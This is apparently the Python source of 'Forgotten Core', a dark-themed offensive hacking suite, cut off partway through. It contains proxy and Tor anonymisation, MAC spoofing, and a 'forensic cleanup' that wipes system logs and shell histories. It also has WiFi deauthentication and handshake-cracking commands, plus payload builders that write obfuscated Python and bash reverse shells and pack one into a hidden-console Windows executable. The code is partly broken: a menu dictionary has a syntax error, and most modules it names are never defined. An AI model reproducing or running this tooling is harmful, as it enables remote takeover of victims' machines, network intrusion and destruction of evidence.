#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════
# FORGOTTEN CORE v1.0 - Architect 02 Penetration Suite
# "What is buried shall remain buried. What is forgotten shall rise."
# ═══════════════════════════════════════════════════════════

import os
import sys
import json
import time
import hashlib
import subprocess
import threading
import socket
import base64
import random
import string
from datetime import datetime
import requests
import argparse
from core.api_effects import APIEffects

# Color codes for dark UI
class Colors:
    DARK_RED = '\033[31m'
    BLOOD_RED = '\033[91m'
    ASH_GRAY = '\033[90m'
    VOID_BLACK = '\033[98m'
    DARK_PURPLE = '\033[95m'
    GHOST_WHITE = '\033[97m'
    ABYSS_BLUE = '\033[94m'
    DECAY_GREEN = '\033[92m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

# ============= VOID ANONYMITY MODULE =============
# Tambahkan setelah import section

class VoidAnonymity:
    """Deep anonymity engine - Multi-layer IP obfuscation"""
    
    def __init__(self, core):
        self.core = core
        self.proxy_chain = []
        self.active_tor = False
        self.active_vpn = False
        self.current_identity = None
        self.anonymity_level = 0  # 1-5, higher = more hidden
        self.void_config = f"{core.void_dir}/anonymity.json"
        self.load_config()
        self.api = APIEffects()

    def load_config(self):
        """Load saved anonymity config"""
        if os.path.exists(self.void_config):
            with open(self.void_config, 'r') as f:
                self.config = json.load(f)
        else:
            self.config = {
                'tor_enabled': False,
                'vpn_enabled': False,
                'chain_length': 3,
                'auto_rotate': 300,
                'kill_switch': True,
                'dns_over_https': True,
                'mac_spoof': True
            }
            self.save_config()
            
    def save_config(self):
        with open(self.void_config, 'w') as f:
            json.dump(self.config, f)
            
    def get_free_proxies(self):
        """Scrape free SOCKS5 proxies from multiple sources"""
        proxies = []
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
        ]
        
        for url in sources:
            try:
                resp = requests.get(url, timeout=10)
                for line in resp.text.split('\n'):
                    if ':' in line and not line.startswith('#'):
                        ip, port = line.strip().split(':')
                        proxies.append(f"socks5://{ip}:{port}")
            except:
                pass
                
        # Add Tor as base if enabled
        if self.config['tor_enabled']:
            proxies.insert(0, "socks5://127.0.0.1:9050")
            
        return list(set(proxies))  # Remove duplicates
    
    def build_void_chain(self, length=None):
        """Build multi-hop proxy chain through the void"""
        if length is None:
            length = self.config['chain_length']
            
        proxies = self.get_free_proxies()
        if len(proxies) < length:
            length = len(proxies)
            print(f"{Colors.ASH_GRAY}[!] Only {length} proxies available{Colors.END}")
            
        # Shuffle and select
        random.shuffle(proxies)
        self.proxy_chain = proxies[:length]
        
        print(f"{Colors.DECAY_GREEN}[+] Void chain built: {len(self.proxy_chain)} hops{Colors.END}")
        for i, proxy in enumerate(self.proxy_chain):
            print(f"{Colors.ASH_GRAY}    Hop {i+1}: {proxy}{Colors.END}")
            
        return self.proxy_chain
    
    def rotate_chain(self):
        """Rotate proxy chain for new identity"""
        print(f"{Colors.ASH_GRAY}[*] Rotating void chain...{Colors.END}")
        self.build_void_chain()
        self.current_identity = self.get_current_ip()
        print(f"{Colors.DECAY_GREEN}[+] New identity: {self.current_identity}{Colors.END}")
        
    def get_current_ip(self):
        """Get current external IP through the void"""
        if not self.proxy_chain:
            self.build_void_chain()
            
        try:
            # Try multiple IP check services
            services = [
                "https://api.ipify.org?format=json",
                "https://ipinfo.io/json",
                "http://httpbin.org/ip",
                "https://checkip.amazonaws.com/"
            ]
            
            for service in services:
                try:
                    resp = self.request_through_void(service, timeout=10)
                    if resp:
                        data = json.loads(resp)
                        ip = data.get('ip', data.get('origin', None))
                        if ip:
                            return ip
                except:
                    continue
            return "Unknown"
        except:
            return "Unknown"
            
    def request_through_void(self, url, method='GET', data=None, headers=None, timeout=30):
        """Make request through full anonymity stack"""
        import socks
        import socket
        
        if not self.proxy_chain:
            self.build_void_chain()
            
        # Use first proxy as SOCKS5
        first_proxy = self.proxy_chain[0].replace('socks5://', '').split(':')
        proxy_ip, proxy_port = first_proxy[0], int(first_proxy[1])
        
        # Create SOCKS5 socket
        socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
        socket.socket = socks.socksocket
        
        try:
            if method.upper() == 'GET':
                resp = requests.get(url, timeout=timeout, verify=False)
            else:
                resp = requests.post(url, data=data, timeout=timeout, verify=False)
            return resp.text
        except:
            return None
        finally:
            # Reset socket
            socket.socket = socket._original_socket if hasattr(socket, '_original_socket') else socket.socket
            
    def start_tor(self):
        """Start Tor service for anonymity"""
        try:
            # Check if Tor is installed
            subprocess.run(['tor', '--version'], capture_output=True)
            
            # Start Tor in background
            tor_config = f"""
SOCKSPort 9050
SOCKSPolicy accept *
DataDirectory {self.core.void_dir}/tor
Log notice file {self.core.ash_dir}/tor.log
ExitNodes {{us}},{{ca}},{{de}},{{nl}},{{fr}},{{ch}},{{se}},{{jp}},{{sg}}
StrictNodes 1
NewCircuitPeriod 30
MaxCircuitDirtiness 60
"""
            with open(f"{self.core.void_dir}/torrc", 'w') as f:
                f.write(tor_config)
                
            subprocess.Popen(['tor', '-f', f"{self.core.void_dir}/torrc"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5)
            self.active_tor = True
            self.config['tor_enabled'] = True
            self.save_config()
            print(f"{Colors.DECAY_GREEN}[+] Tor activated. Circuit built.{Colors.END}")
            return True
        except:
            print(f"{Colors.DARK_RED}[!] Tor not installed. Install with: pkg install tor{Colors.END}")
            return False
            
    def stop_tor(self):
        """Stop Tor service"""
        os.system("pkill tor")
        self.active_tor = False
        self.config['tor_enabled'] = False
        self.save_config()
        print(f"{Colors.ASH_GRAY}[+] Tor deactivated{Colors.END}")
        
    def start_vpn(self, provider='protonvpn'):
        """Start VPN connection"""
        try:
            if provider == 'protonvpn':
                subprocess.run(['protonvpn', 'connect', '-r'], timeout=30)
            elif provider == 'mullvad':
                subprocess.run(['mullvad', 'relay', 'set', 'location', 'random'])
                subprocess.run(['mullvad', 'connect'])
            self.active_vpn = True
            self.config['vpn_enabled'] = True
            self.save_config()
            print(f"{Colors.DECAY_GREEN}[+] VPN connected via {provider}{Colors.END}")
            return True
        except:
            print(f"{Colors.DARK_RED}[!] VPN not configured{Colors.END}")
            return False
            
    def stop_vpn(self):
        """Disconnect VPN"""
        try:
            subprocess.run(['protonvpn', 'disconnect'])
            subprocess.run(['mullvad', 'disconnect'])
        except:
            pass
        self.active_vpn = False
        self.config['vpn_enabled'] = False
        self.save_config()
        print(f"{Colors.ASH_GRAY}[+] VPN disconnected{Colors.END}")
        
    def mac_spoof(self, interface=None):
        """Randomize MAC address"""
        if not interface:
            # Auto-detect interface
            interfaces = os.listdir('/sys/class/net/')
            for iface in interfaces:
                if iface.startswith('wlan') or iface.startswith('eth'):
                    interface = iface
                    break
                    
        if interface:
            try:
                os.system(f"ifconfig {interface} down")
                os.system(f"macchanger -r {interface}")
                os.system(f"ifconfig {interface} up")
                print(f"{Colors.DECAY_GREEN}[+] MAC address randomized on {interface}{Colors.END}")
            except:
                print(f"{Colors.DARK_RED}[!] MAC spoof failed (need root){Colors.END}")
                
    def dns_over_https(self, enable=True):
        """Enable DNS over HTTPS to prevent DNS leaks"""
        doh_servers = [
            "https://cloudflare-dns.com/dns-query",
            "https://dns.google/dns-query",
            "https://dns.quad9.net/dns-query"
        ]
        
        if enable:
            # Override DNS resolution
            import dns.resolver
            dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
            dns.resolver.default_resolver.nameservers = ['1.1.1.1', '8.8.8.8']
            self.config['dns_over_https'] = True
            print(f"{Colors.DECAY_GREEN}[+] DNS over HTTPS enabled{Colors.END}")
        else:
            self.config['dns_over_https'] = False
            print(f"{Colors.ASH_GRAY}[+] DNS over HTTPS disabled{Colors.END}")
        self.save_config()
        
    def kill_switch(self):
        """Kill switch - drop all connections if anonymity fails"""
        if self.config['kill_switch']:
            try:
                # Block all non-Tor traffic
                os.system("iptables -F")
                os.system("iptables -A OUTPUT -m owner --uid-owner debian-tor -j ACCEPT")
                os.system("iptables -A OUTPUT -j DROP")
                print(f"{Colors.DECAY_GREEN}[+] Kill switch activated{Colors.END}")
            except:
                print(f"{Colors.DARK_RED}[!] Kill switch failed (need root){Colors.END}")
                
    def traffic_mix(self, data, delay_range=(0.1, 0.5)):
        """Add traffic mixing and random delays"""
        import random
        import time
        
        # Add random padding
        padding = os.urandom(random.randint(32, 256))
        mixed = data + padding
        
        # Random delay
        time.sleep(random.uniform(*delay_range))
        
        return mixed
        
    def forensic_cleanup(self):
        """Clean all traces from the system"""
        print(f"{Colors.ASH_GRAY}[*] Performing forensic cleanup...{Colors.END}")
        
        # Clear shell history
        os.system("history -c")
        os.system("echo > ~/.bash_history")
        os.system("echo > ~/.zsh_history")
        
        # Clear logs
        os.system("rm -rf /var/log/* 2>/dev/null")
        os.system("journalctl --rotate 2>/dev/null")
        os.system("journalctl --vacuum-time=1s 2>/dev/null")
        
        # Clear temp
        os.system("rm -rf /tmp/* 2>/dev/null")
        os.system("rm -rf /var/tmp/* 2>/dev/null")
        
        # Clear Python cache
        os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
        
        # Clear termux history
        if os.path.exists("/data/data/com.termux/files/home/.termux/shell_history"):
            os.system("echo > /data/data/com.termux/files/home/.termux/shell_history")
            
        print(f"{Colors.DECAY_GREEN}[+] Traces erased from existence{Colors.END}")
        
    def check_leaks(self):
        """Check for IP and DNS leaks"""
        print(f"\n{Colors.BLOOD_RED}[*] Checking for leaks...{Colors.END}")
        
        leaks = {
            'ip': [],
            'dns': [],
            'webrtc': False
        }
        
        # Check IP from multiple sources
        ip_services = [
            "https://api.ipify.org?format=json",
            "https://ipinfo.io/json",
            "http://httpbin.org/ip",
            "https://checkip.amazonaws.com/"
        ]
        
        for service in ip_services:
            try:
                resp = self.request_through_void(service)
                if resp:
                    data = json.loads(resp)
                    ip = data.get('ip', data.get('origin', 'Unknown'))
                    leaks['ip'].append(ip)
            except:
                pass
                
        # Check for leaks
        unique_ips = set(leaks['ip'])
        if len(unique_ips) == 1:
            print(f"{Colors.DECAY_GREEN}[✓] IP consistent: {unique_ips.pop()}{Colors.END}")
        else:
            print(f"{Colors.DARK_RED}[!] IP LEAK DETECTED! Multiple IPs: {unique_ips}{Colors.END}")
            
        return leaks

class VoidAnonymityModule:
    """Void Anonymity Module - IP obfuscation for Forgotten Core"""
    
    def __init__(self, core):
        self.core = core
        self.anonymity = VoidAnonymity(core)
        
    def awaken(self):
        """Main menu for Void Anonymity"""
        print(f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════╗
║                    VOID ANONYMITY MODULE                           ║
║              "Vanish without a trace"                               ║
╠═══════════════════════════════════════════════════════════════╣{Colors.END}

{Colors.DECAY_GREEN}[01]{Colors.GHOST_WHITE} Build Void Chain     {Colors.ASH_GRAY}»»  Multi-hop proxy chain{Colors.END}
{Colors.DECAY_GREEN}[02]{Colors.GHOST_WHITE} Rotate Identity      {Colors.ASH_GRAY}»»  Change current IP{Colors.END}
{Colors.DECAY_GREEN}[03]{Colors.GHOST_WHITE} Check Current IP     {Colors.ASH_GRAY}»»  Show exit IP{Colors.END}
{Colors.DECAY_GREEN}[04]{Colors.GHOST_WHITE} Activate Tor         {Colors.ASH_GRAY}»»  Enable Tor routing{Colors.END}
{Colors.DECAY_GREEN}[05]{Colors.GHOST_WHITE} Activate VPN         {Colors.ASH_GRAY}»»  Enable VPN connection{Colors.END}
{Colors.DECAY_GREEN}[06]{Colors.GHOST_WHITE} MAC Spoof            {Colors.ASH_GRAY}»»  Randomize MAC address{Colors.END}
{Colors.DECAY_GREEN}[07]{Colors.GHOST_WHITE} DNS over HTTPS       {Colors.ASH_GRAY}»»  Prevent DNS leaks{Colors.END}
{Colors.DECAY_GREEN}[08]{Colors.GHOST_WHITE} Kill Switch          {Colors.ASH_GRAY}»»  Drop on anonymity fail{Colors.END}
{Colors.DECAY_GREEN}[09]{Colors.GHOST_WHITE} Check Leaks          {Colors.ASH_GRAY}»»  Verify anonymity{Colors.END}
{Colors.DECAY_GREEN}[10]{Colors.GHOST_WHITE} Forensic Cleanup     {Colors.ASH_GRAY}»»  Wipe all traces{Colors.END}
{Colors.DECAY_GREEN}[11]{Colors.GHOST_WHITE} Auto-Rotate          {Colors.ASH_GRAY}»»  Auto identity rotation{Colors.END}
{Colors.DECAY_GREEN}[12]{Colors.GHOST_WHITE} Full Anonymity       {Colors.ASH_GRAY}»»  Enable all protections{Colors.END}
{Colors.DECAY_GREEN}[00]{Colors.GHOST_WHITE} Return to Core       {Colors.ASH_GRAY}»»  Back to main menu{Colors.END}
        """)
        
        choice = input(f"\n{Colors.BLOOD_RED}ForgottenCore{Colors.GHOST_WHITE}@{Colors.BLOOD_RED}void_anon{Colors.GHOST_WHITE}~# {Colors.END}")
        
        if choice == '1':
            length = input("Chain length (default 5): ") or "5"
            self.anonymity.build_void_chain(int(length))
        elif choice == '2':
            self.anonymity.rotate_chain()
        elif choice == '3':
            ip = self.anonymity.get_current_ip()
            print(f"{Colors.DECAY_GREEN}[+] Current void IP: {ip}{Colors.END}")
        elif choice == '4':
            self.anonymity.start_tor()
        elif choice == '5':
            provider = input("VPN provider (protonvpn/mullvad): ") or "protonvpn"
            self.anonymity.start_vpn(provider)
        elif choice == '6':
            iface = input("Interface (auto if empty): ") or None
            self.anonymity.mac_spoof(iface)
        elif choice == '7':
            self.anonymity.dns_over_https(True)
        elif choice == '8':
            self.anonymity.kill_switch()
        elif choice == '9':
            self.anonymity.check_leaks()
        elif choice == '10':
            self.anonymity.forensic_cleanup()
        elif choice == '11':
            interval = input("Rotation interval (seconds, default 300): ") or "300"
            print(f"[*] Auto-rotate started every {interval}s")
            def auto_rotate():
                while True:
                    time.sleep(int(interval))
                    self.anonymity.rotate_chain()
            thread = threading.Thread(target=auto_rotate)
            thread.daemon = True
            thread.start()
        elif choice == '12':
            self.full_anonymity()
            
    def full_anonymity(self):
        """Enable all anonymity layers"""
        print(f"\n{Colors.BLOOD_RED}[*] Activating full void anonymity...{Colors.END}")
        
        # Layer 1: MAC Spoof
        print(f"{Colors.ASH_GRAY}[1/6] Spoofing MAC address...{Colors.END}")
        self.anonymity.mac_spoof()
        
        # Layer 2: DNS over HTTPS
        print(f"{Colors.ASH_GRAY}[2/6] Enabling DNS over HTTPS...{Colors.END}")
        self.anonymity.dns_over_https(True)
        
        # Layer 3: Tor
        print(f"{Colors.ASH_GRAY}[3/6] Activating Tor network...{Colors.END}")
        self.anonymity.start_tor()
        
        # Layer 4: Build chain
        print(f"{Colors.ASH_GRAY}[4/6] Building void chain...{Colors.END}")
        self.anonymity.build_void_chain(5)
        
        # Layer 5: Kill switch
        print(f"{Colors.ASH_GRAY}[5/6] Activating kill switch...{Colors.END}")
        self.anonymity.kill_switch()
        
        # Layer 6: Check
        print(f"{Colors.ASH_GRAY}[6/6] Verifying anonymity...{Colors.END}")
        time.sleep(3)
        ip = self.anonymity.get_current_ip()
        print(f"\n{Colors.DECAY_GREEN}[✓] Full anonymity activated!{Colors.END}")
        print(f"{Colors.DECAY_GREEN}[✓] Current exit IP: {ip}{Colors.END}")
        print(f"{Colors.DECAY_GREEN}[✓] Chain length: {len(self.anonymity.proxy_chain)} hops{Colors.END}")
        print(f"{Colors.DECAY_GREEN}[✓] Tor status: {'Active' if self.anonymity.active_tor else 'Inactive'}{Colors.END}")
        
        # Start auto-rotation
        def auto_rotate():
            while True:
                time.sleep(300)
                self.anonymity.rotate_chain()
                print(f"{Colors.ASH_GRAY}[*] Identity rotated. New IP: {self.anonymity.get_current_ip()}{Colors.END}")
                
        thread = threading.Thread(target=auto_rotate)
        thread.daemon = True
        thread.start()

class ForgottenCore:
    def __init__(self):
        self.version = "1.0.0"
        self.codename = "Echoes of the Void"
        self.author = "ZETH"
        self.core_id = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
        self.void_dir = os.path.expanduser("~/.forgotten_core")
        self.abyss_dir = f"{self.void_dir}/abyss_modules"
        self.shadow_dir = f"{self.void_dir}/shadow_payloads"
        self.ash_dir = f"{self.void_dir}/ash_logs"
        self.spectre_file = f"{self.void_dir}/spectres.json"
        
        self.setup_void()
        self.summon_modules()
        
    def setup_void(self):
        """Create necessary directories in the void"""
        for d in [self.void_dir, self.abyss_dir, self.shadow_dir, self.ash_dir]:
            os.makedirs(d, exist_ok=True)
    
    def banner(self):
        """Display Forgotten Core banner - dark and ominous"""
        banner = f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════════╗
{Colors.DARK_RED}║{Colors.BLOOD_RED}{Colors.BOLD}   ███████╗ ██████╗ ██████╗  ██████╗ ████████╗████████╗███████╗███╗   ██╗{Colors.DARK_RED}   ║
{Colors.DARK_RED}║{Colors.BLOOD_RED}{Colors.BOLD}   ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝╚══██╔══╝██╔════╝████╗  ██║{Colors.DARK_RED}   ║
{Colors.DARK_RED}║{Colors.BLOOD_RED}{Colors.BOLD}   █████╗  ██║   ██║██████╔╝██║   ██║   ██║      ██║   █████╗  ██╔██╗ ██║{Colors.DARK_RED}   ║
{Colors.DARK_RED}║{Colors.BLOOD_RED}{Colors.BOLD}   ██╔══╝  ██║   ██║██╔══██╗██║   ██║   ██║      ██║   ██╔══╝  ██║╚██╗██║{Colors.DARK_RED}   ║
{Colors.DARK_RED}║{Colors.BLOOD_RED}{Colors.BOLD}   ██║     ╚██████╔╝██║  ██║╚██████╔╝   ██║      ██║   ███████╗██║ ╚████║{Colors.DARK_RED}   ║
{Colors.DARK_RED}║{Colors.BLOOD_RED}{Colors.BOLD}   ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═══╝{Colors.DARK_RED}   ║
{Colors.DARK_RED}║{Colors.ASH_GRAY}                              ██████╗ ██████╗ ██████╗ ███████╗{Colors.DARK_RED}                 ║
{Colors.DARK_RED}║{Colors.ASH_GRAY}                             ██╔════╝██╔═══██╗██╔══██╗██╔════╝{Colors.DARK_RED}                 ║
{Colors.DARK_RED}║{Colors.ASH_GRAY}                             ██║     ██║   ██║██████╔╝█████╗  {Colors.DARK_RED}                 ║
{Colors.DARK_RED}║{Colors.ASH_GRAY}                             ██║     ██║   ██║██╔══██╗██╔══╝  {Colors.DARK_RED}                 ║
{Colors.DARK_RED}║{Colors.ASH_GRAY}                             ╚██████╗╚██████╔╝██║  ██║███████╗{Colors.DARK_RED}                 ║
{Colors.DARK_RED}║{Colors.ASH_GRAY}                              ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝{Colors.DARK_RED}                 ║
{Colors.DARK_RED}╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
{Colors.DARK_PURPLE}{Colors.DIM}                    v{self.version} - "{self.codename}"{Colors.END}
{Colors.ASH_GRAY}{Colors.DIM}                "What is buried shall remain buried. What is forgotten shall rise."{Colors.END}
        """
        print(banner)
        
    def summon_modules(self):
        """Summon all modules from the abyss"""
        self.modules = {
            # Void Network Attacks
            'void_wifi': VoidWiFiModule(self),
            'void_bluetooth': VoidBluetoothModule(self),
            'void_network': VoidNetworkModule(self),
            
            # Abyss Exploitation
            'abyss_exploit': AbyssExploitModule(self),
            'abyss_payload': AbyssPayloadModule(self),
            'abyss_reverse': AbyssReverseModule(self),
            
            # Shadow Web Attacks
            'shadow_web': ShadowWebModule(self),
            'shadow_sql': ShadowSQLModule(self),
            'shadow_xss': ShadowXSSModule(self),
            
            # Forgotten Android
            'forgotten_android': ForgottenAndroidModule(self),
            'forgotten_termux': ForgottenTermuxModule(self),
            
            # Spectre C2
            'spectre_c2': SpectreC2Module(self),
            'spectre_botnet': SpectreBotnetModule(self),
            
            # Ghost OSINT
            'ghost_osint': GhostOSINTModule(self),
            'ghost_recon': GhostReconModule(self),
            
            # Wraith HID
            'wraith_hid': WraithHIDModule(self),
            'wraith_usb': WraithUSBModule(self),
            
            # Phantom Social Engineering
            'phantom_se': PhantomSEModule(self),
            'phantom_phish': PhantomPhishModule(self),
            
            # Crypt Keeper
            'crypt_keeper': CryptKeeperModule(self),
            'crypt_stealth': CryptStealthModule(self),
            
            # Tomb Privilege
            'tomb_priv': TombPrivilegeModule(self),
            'tomb_persist': TombPersistModule(self),
            # void_anonymity
            'void_anonymity': VoidAnonymityModule(self)
        }
        
    def show_menu(self):
        """Display main menu - cryptic and dark"""
        print(f"""
{Colors.BLOOD_RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    THE FORGOTTEN CORE                        ║
║              "Awaken the darkness within"                    ║
╠═══════════════════════════════════════════════════════════════╣{Colors.END}

{Colors.DECAY_GREEN}[01]{Colors.GHOST_WHITE} Void WiFi        {Colors.ASH_GRAY}»»  Break the spectral waves{Colors.END}
{Colors.DECAY_GREEN}[02]{Colors.GHOST_WHITE} Void Bluetooth   {Colors.ASH_GRAY}»»  Pierce the wireless veil{Colors.END}
{Colors.DECAY_GREEN}[03]{Colors.GHOST_WHITE} Void Network     {Colors.ASH_GRAY}»»  Corrupt the digital veins{Colors.END}
{Colors.DECAY_GREEN}[04]{Colors.GHOST_WHITE} Abyss Exploit    {Colors.ASH_GRAY}»»  Unleash the ancient cracks{Colors.END}
{Colors.DECAY_GREEN}[05]{Colors.GHOST_WHITE} Shadow Web       {Colors.ASH_GRAY}»»  Taint the mortal web{Colors.END}
{Colors.DECAY_GREEN}[06]{Colors.GHOST_WHITE} Forgotten Android{Colors.ASH_GRAY}»»  Possess the green machine{Colors.END}
{Colors.DECAY_GREEN}[07]{Colors.GHOST_WHITE} Spectre C2       {Colors.ASH_GRAY}»»  Command the undead legion{Colors.END}
{Colors.DECAY_GREEN}[08]{Colors.GHOST_WHITE} Ghost OSINT      {Colors.ASH_GRAY}»»  Unearth the hidden truths{Colors.END}
{Colors.DECAY_GREEN}[09]{Colors.GHOST_WHITE} Wraith HID       {Colors.ASH_GRAY}»»  Become the phantom touch{Colors.END}
{Colors.DECAY_GREEN}[10]{Colors.GHOST_WHITE} Phantom SE       {Colors.ASH_GRAY}»»  Weave the web of lies{Colors.END}
{Colors.DECAY_GREEN}[11]{Colors.GHOST_WHITE} Tomb Privilege   {Colors.ASH_GRAY}»»  Rise from the depths{Colors.END}
{Colors.DECAY_GREEN}[12]{Colors.GHOST_WHITE} Crypt Keeper     {Colors.ASH_GRAY}»»  Lock or break the seals{Colors.END}
{Colors.DECAY_GREEN}[13]{Colors.GHOST_WHITE} Abyss Payload    {Colors.ASH_GRAY}»»  Forge the instruments{Colors.END}
{Colors.DECAY_GREEN}[14]{Colors.GHOST_WHITE} Spectre Botnet   {Colors.ASH_GRAY}»»  Build the shadow army{Colors.END}
{Colors.DECAY_GREEN}[15]{Colors.GHOST_WHITE} Crypt Stealth    {Colors.ASH_GRAY}»»  Erase from existence{Colors.END}
{Colors.DECAY_GREEN}[16]{Colors.GHOST_WHITE} Void Anonymity   {Colors.ASH_GRAY}»»  Vanish without trace{Colors.END}
{Colors.DECAY_GREEN}[00]{Colors.GHOST_WHITE} Return to Void   {Colors.ASH_GRAY}»»  Fade into nothing{Colors.END}

{Colors.DARK_RED}{Colors.DIM}╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
    def invoke_module(self, module_name):
        """Invoke module from the abyss"""
        if module_name in self.modules:
            module = self.modules[module_name]
            module.awaken()
        else:
            print(f"{Colors.DARK_RED}[!] The module '{module_name}' remains forgotten...{Colors.END}")
            
    def main_loop(self):
        """Main execution loop - eternal"""
        self.banner()
        
        while True:
            try:
                self.show_menu()
                choice = input(f"\n{Colors.BLOOD_RED}ForgottenCore{Colors.GHOST_WHITE}@{Colors.BLOOD_RED}void{Colors.GHOST_WHITE}~# {Colors.END}")
                
                modules_map = {
                    '1': 'void_wifi', '2': 'void_bluetooth', '3': 'void_network',
                    '4': 'abyss_exploit', '5': 'shadow_web', '6': 'forgotten_android',
                    '7': 'spectre_c2', '8': 'ghost_osint', '9': 'wraith_hid',
                    '10': 'phantom_se', '11': 'tomb_priv', '12': 'crypt_keeper',
                    '13': 'abyss_payload', '14': 'spectre_botnet', '15': 'crypt_stealth'
                    '16': 'void_anonymity',
                }
                
                if choice == '0':
                    print(f"\n{Colors.ASH_GRAY}[!] The core returns to the void. Traces erased from memory...{Colors.END}")
                    sys.exit(0)
                elif choice in modules_map:
                    self.invoke_module(modules_map[choice])
                else:
                    print(f"{Colors.DARK_RED}[!] That path leads to nothing...{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.ASH_GRAY}[!] Interrupted. The core sleeps...{Colors.END}")
                sys.exit(0)
            except Exception as e:
                print(f"{Colors.DARK_RED}[!] Void error: {e}{Colors.END}")

# ============= ABYSS MODULES =============

class VoidWiFiModule:
    def __init__(self, core):
        self.core = core
        
    def awaken(self):
        print(f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════╗
║                    VOID WIFI MODULE                               ║
║              "Break the spectral barrier"                          ║
╠═══════════════════════════════════════════════════════════════╣{Colors.END}

{Colors.DECAY_GREEN}[1]{Colors.GHOST_WHITE} Awaken Monitor Mode
{Colors.DECAY_GREEN}[2]{Colors.GHOST_WHITE} Spectral Scan
{Colors.DECAY_GREEN}[3]{Colors.GHOST_WHITE} Wraith Deauth
{Colors.DECAY_GREEN}[4]{Colors.GHOST_WHITE} Capture Spectral Handshake
{Colors.DECAY_GREEN}[5]{Colors.GHOST_WHITE} Crack the Void
{Colors.DECAY_GREEN}[6]{Colors.GHOST_WHITE} Twin Phantom AP
{Colors.DECAY_GREEN}[7]{Colors.GHOST_WHITE} Return to Core
        """)
        
        choice = input("\nForgottenCore/VoidWiFi> ")
        
        if choice == '1':
            iface = input("Interface (wlan0): ") or "wlan0"
            os.system(f"airmon-ng start {iface}")
            print(f"[+] Spectral mode awakened on {iface}mon")
        elif choice == '2':
            iface = input("Monitor interface: ")
            duration = input("Scan duration (30s): ") or "30"
            os.system(f"airodump-ng {iface} --write /sdcard/void_scan")
        elif choice == '3':
            iface = input("Interface: ")
            bssid = input("Target BSSID: ")
            client = input("Client MAC (optional): ")
            count = input("Packet count (10): ") or "10"
            if client:
                os.system(f"aireplay-ng --deauth {count} -a {bssid} -c {client} {iface}")
            else:
                os.system(f"aireplay-ng --deauth {count} -a {bssid} {iface}")
        elif choice == '4':
            iface = input("Interface: ")
            bssid = input("Target BSSID: ")
            channel = input("Channel: ")
            os.system(f"airodump-ng --bssid {bssid} -c {channel} --write handshake {iface}")
        elif choice == '5':
            cap_file = input("CAP file path: ")
            wordlist = input("Wordlist path: ") or "/usr/share/wordlists/rockyou.txt"
            os.system(f"aircrack-ng -w {wordlist} {cap_file}")

class AbyssPayloadModule:
    def __init__(self, core):
        self.core = core
        
    def awaken(self):
        print(f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════╗
║                    ABYSS PAYLOAD MODULE                           ║
║              "Forge the instruments of chaos"                      ║
╠═══════════════════════════════════════════════════════════════╣{Colors.END}

{Colors.DECAY_GREEN}[1]{Colors.GHOST_WHITE} Windows Spectre (exe)
{Colors.DECAY_GREEN}[2]{Colors.GHOST_WHITE} Linux Wraith (elf)
{Colors.DECAY_GREEN}[3]{Colors.GHOST_WHITE} Android Phantom (apk)
{Colors.DECAY_GREEN}[4]{Colors.GHOST_WHITE} iOS Shadow (ipa)
{Colors.DECAY_GREEN}[5]{Colors.GHOST_WHITE} Python Void
{Colors.DECAY_GREEN}[6]{Colors.GHOST_WHITE} PowerShell Ghost
{Colors.DECAY_GREEN}[7]{Colors.GHOST_WHITE} Bash Spectre
{Colors.DECAY_GREEN}[8]{Colors.GHOST_WHITE} Polymorphic Abomination
{Colors.DECAY_GREEN}[9]{Colors.GHOST_WHITE} FUD (Fully Undetectable)
{Colors.DECAY_GREEN}[0]{Colors.GHOST_WHITE} Return to Core
        """)
        
        choice = input("\nForgottenCore/AbyssPayload> ")
        
        if choice == '1':
            self.windows_spectre()
        elif choice == '2':
            self.linux_wraith()
        elif choice == '3':
            self.android_phantom()
        elif choice == '4':
            self.ios_shadow()
        elif choice == '5':
            self.python_void()
        elif choice == '6':
            self.powershell_ghost()
        elif choice == '7':
            self.bash_spectre()
        elif choice == '8':
            self.polymorphic_abomination()
        elif choice == '9':
            self.fud_void()
            
    def windows_spectre(self):
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        output = input("Output file: ")
        
        encoded = base64.b64encode(f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
""".encode()).decode()
        
        with open(output, 'w') as f:
            f.write(f"import base64;exec(base64.b64decode('{encoded}').decode())")
        
        os.system(f"pyinstaller --onefile --noconsole {output}")
        print(f"[+] Windows Spectre created: {output}.exe")
        
    def linux_wraith(self):
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        output = input("Output file: ")
        
        payload = f"""#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
"""
        with open(output, 'w') as f:
            f.write(payload)
        os.chmod(output, 0o755)
        print(f"[+] Linux Wraith created: {output}")
        
    def android_phantom(self):
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
